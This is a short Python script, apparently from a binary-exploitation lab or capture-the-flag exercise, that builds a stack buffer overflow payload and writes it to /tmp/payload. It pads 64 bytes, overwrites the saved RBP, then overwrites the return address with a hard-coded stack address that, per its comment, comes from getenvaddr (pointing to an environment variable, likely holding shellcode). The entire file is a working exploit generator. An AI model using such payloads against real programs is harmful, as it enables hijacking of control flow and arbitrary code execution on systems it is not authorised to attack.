#!/usr/bin/env python3
import struct

OFFSET_TO_RBP = 64

RET_ADDR = 0x7fffffffe50b # exact address from getenvaddr, same shell session

payload  = b'A' * OFFSET_TO_RBP            # padding up to saved RBP
payload += b'B' * 8                         # overwritten saved RBP (value irrelevant)
payload += struct.pack('<Q', RET_ADDR)      # overwritten return address
payload += struct.pack('<Q', RET_ADDR)      # repeated once for margin

with open('/tmp/payload', 'wb') as f:
    f.write(payload)
